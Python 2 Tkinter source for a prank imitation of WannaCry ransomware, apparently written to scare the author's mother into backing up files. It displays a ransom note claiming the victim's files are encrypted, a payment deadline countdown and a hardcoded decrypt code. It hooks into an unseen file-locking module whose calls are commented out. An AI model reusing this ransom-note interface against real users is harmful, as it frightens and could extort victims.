#coding: utf
from Tkinter import * 
from PIL import Image, ImageTk
import tkSimpleDialog, tkMessageBox
import time
import threading
from attackAndSave import *

class Virus:
    def __init__(self):
        # attack()
        self.window = Tk()
        self.window.minsize(width = WIDTH, height = HEIGHT)
        # self.window.resizable(0,0)
        self.window.iconbitmap('skeleton.ico')
        self.window.attributes("-toolwindow", 1) # 去掉最大化和最小化，防止出bug
        self.window.title("Wanna cry 3.0")
        self.main()
        return
        
    def main(self):
        try:
            self.frame.destroy()
        except:
            pass
        self.frame = Frame(self.window, width = WIDTH, height = HEIGHT)
        self.background_image = ImageTk.PhotoImage(Image.open('virus.png'))
        self.background_label = Label(self.frame, image = self.background_image)
        self.background_label.place(x = 0, y = 0, relwidth = 1, relheight = 1)        
        # title
        Label(self.frame, font = ('Purisa', 16, 'bold'), text = "Ooops, your files have been encrypted!", fg = '#00FF00', bg = '#000000').place(x = WIDTH / 2, y = 30, anchor = 'center')
        
        # main text
        mainText1 = "What happened to my computer?? \n\n \
        We have encrypted some important files in your computer, \
        \n now you can't open all the Microsoft office files and the PDF files. \
        \n Maybe you are busy looking for ways to decrypt your files :) \
        \n Please don't waste your time, NOBODY can save you. \
        \n You will lose your files FOREVER without our decryption service! \n\n\n\n"
        Label(self.frame, font = ('Purisa', 11), text = mainText1, width = 50, height = 12, fg = '#00FF00', bg = '#000000').place(x = WIDTH / 2 + 150, y = 180, anchor = 'center')
        
        mainText2 = "Can I recover my files?? \n\n  \
        SURE! We guarantee that you can recover all your files. \
        \n But as you probably know, you have to PAY to learn the lesson :) \
        \n Please don't get mad, we just want to teach you a good lesson of \
        \n BACKING UP all the important files frequently! \
        \n Go clicking 'Contact me' to know what price you need to pay \
        \n to get your files back. Pay attention to the time though. \
        \n\n tic tac, tic tac, tic tac..."
        Label(self.frame, font = ('Purisa', 11), text = mainText2, width = 50, height = 12, fg = '#00FF00', bg = '#000000').place(x = WIDTH / 2 + 150, y = 330, anchor = 'center')
        
        #countDown
        clockText = "You must contact me before this date: \
        \n 2017/06/01  00:00:00, \
        \n or your files will be lost FOREVER \
        \n\n Time left \n\n\n"
        Label(self.frame, font = ('Purisa', 12), text = clockText, fg = '#00FF00', bg = '#000000').place(x = 160, y = 250, anchor = 'center')

        self.flagCount = True
        self.timeNow()
        th_clock = threading.Thread(target = self.sendCountSignal) # 另一个线程用来产生倒计时效果
        th_clock.setDaemon(True)
        th_clock.start()
          
        Label(self.frame, font = ('Purisa', 10), text = "Author: littleRain    Coders rule the world!", fg = '#00FF00', bg = '#000000').place(x = WIDTH / 2, y = 480, anchor = 'center')        
        Button(self.frame, font = ('Purisa', 12), text = 'Contact me', width = 20, height = 1, command = self.contact, fg = '#00FF00', bg = '#000000').place(x = 230, y = 520, anchor = 'center')
        Button(self.frame, font = ('Purisa', 12), text = 'Decrypt my files', width = 20, height = 1, command = self.decrypt, fg = '#00FF00', bg = '#000000').place(x = 570, y = 520, anchor = 'center')
        self.frame.pack()
        return
    
    def sendCountSignal(self):
        while(self.timeShow != 'Time out' and self.flagCount):
            self.countDown()
            time.sleep(1)
        if self.timeShow == 'Time out' and not self.flagCount:
            self.clockCount = Label(self.frame, font = ('Purisa', 16, 'bold'), fg = '#00FF00', bg = '#000000')
            self.clockCount.place(x = 140, y = 300, anchor = 'center')
            self.clockCount["text"] = "{}:{}:{}:{}".format('00', '00', '00', '00')
        return
    
    def countDown(self):
        try:
            self.clockCount.destroy()
        except:
            pass
        self.clockCount = Label(self.frame, font = ('Purisa', 20, 'bold'), fg = '#00FF00', bg = '#000000')
        self.clockCount.place(x = 160, y = 300, anchor = 'center')
        clock = self.timeNow()
        if clock != 'Time out':
            self.clockCount["text"] = "{}:{}:{}:{}".format(clock[0], clock[1], clock[2], clock[3])
        return
        
    # def timeLeft(self):
        # self.timeShow[-1] -= 1
        # if self.timeShow[-1] < 0:
            # self.timeShow[-2] -= 1
            # self.timeShow[-1] = 59
        # if self.timeShow[-2] < 0:
            # self.timeShow[-3] -= 1
            # self.timeShow[-2] = 59
        # if self.timeShow[-3] < 0:
            # self.timeShow[-4] -= 1
            # self.timeShow[-3] = 23
        # if self.timeShow[0] <= 0 and self.timeShow[1] <= 0 and self.timeShow[2] <= 0 and self.timeShow[3] <= 0:
            # self.timeShow = 'Time out'
            # return 'Time out'
        # else:
            # clock = [0,0,0,0]
            # clock[-1] = str(self.timeShow[-1]) if self.timeShow[-1] > 9 else ('0' + str(self.timeShow[-1]))
            # clock[-2] = str(self.timeShow[-2]) if self.timeShow[-2] > 9 else ('0' + str(self.timeShow[-2]))
            # clock[-3] = str(self.timeShow[-3]) if self.timeShow[-3] > 9 else ('0' + str(self.timeShow[-3]))
            # clock[-4] = str(self.timeShow[-4]) if self.timeShow[-4] > 9 else ('0' + str(self.timeShow[-4]))
            # return clock
        
    
    def timeNow(self):
        now = time.strftime('%Y-%j-%H-%M-%S',time.localtime(time.time())).split('-')
        day = int(now[1])
        if day == 151:
            return 'Time out'
        hour = int(now[2])
        min = int(now[3])
        sec = int(now[4])
        clock = [0,0,0,0]
        self.timeShow = [0,0,0,0]
        self.timeShow[0] = 150 - day
        self.timeShow[1] = 23 - hour
        self.timeShow[2] = 59 - min
        self.timeShow[3] = 59 - sec
        clock = [0,0,0,0]
        clock[0] = str(self.timeShow[0]) if self.timeShow[0] > 9 else ('0' + str(self.timeShow[0]))
        clock[1] = str(self.timeShow[1]) if self.timeShow[1] > 9 else ('0' + str(self.timeShow[1]))
        clock[2] = str(self.timeShow[2]) if self.timeShow[2] > 9 else ('0' + str(self.timeShow[2]))
        clock[3] = str(self.timeShow[3]) if self.timeShow[3] > 9 else ('0' + str(self.timeShow[3]))
        return clock
        
    def contact(self):
        self.flagCount = False
        self.frame.destroy()
        self.frame = Frame(self.window, width = WIDTH, height = HEIGHT)
        self.background_image = ImageTk.PhotoImage(Image.open('virus.png'))
        self.background_label = Label(self.frame, image = self.background_image)
        self.background_label.place(x = 0, y = 0, relwidth = 1, relheight = 1)  
        Label(self.frame, font = ('Purisa', 20, 'bold'), text = "How to decrypt", fg = '#00FF00', bg = '#000000').place(x = WIDTH / 2, y = 50, anchor = 'center')
        mainText = "HAHA got you mom, I am xiaoyu, as you probably guess by the author littleRain. \
        \n I got inspiration of this trick from the real virus Wanna cry. \
        \n I used to tell you to back up all the important files frequently. \
        \n I don't know if you follow my advises or not, so I came up with this trick, \
        \n just to let you know that even a amateur like me can write the virus \
        \n to lock up your files, you should never underestimate the power of coding. \
        \n I sincerely hope this trick didn't make you mad or frighten you. \
        \n And I do hope you can learn a lesson from it and back up your files from NOW! \
        \n\n PS: Please contact me for the way of decrypting the files."
        Label(self.frame, font = ('Purisa', 15), text = mainText, fg = '#00FF00', bg = '#000000').place(x = WIDTH / 2, y = HEIGHT / 2, anchor = 'center')
        Button(self.frame, font = ('Purisa', 14), text = 'Back', width = 20, height = 1, command = self.main, fg = '#00FF00', bg = '#000000').place(x = WIDTH / 2, y = 500, anchor = 'center')        
        self.frame.pack()
        return
        
    def decrypt(self):
        codeDecrypt = '359193'
        answer = tkSimpleDialog.askstring('Decryption', 'Code to enter?')
        # answer = ''
        # topWindow = Tk()
        # topWindow.title("Decryption")
        # topWindow.iconbitmap('skeleton.ico')
        # topWindow.resizable(100, 200)
        # top = Frame(topWindow, width = 100, height = 200)
        # Message(top, text = 'Code?').pack()
        # answer = StringVar()
        # Entry(top, textvariable = answer).pack()
        # Button(top, text = "OK", command = top.destroy).pack()
        # topWindow.mainloop()
        
        if answer == codeDecrypt:
            # save()
            tkMessageBox.showinfo('All done!', 'The decryption is done, enjoy!')
        else:
            tkMessageBox.showwarning('Error!', 'The code is not correct!')
        self.timeNow()
        return
        
        
    
WIDTH = 800
HEIGHT = 550            
app = Virus()
app.window.mainloop()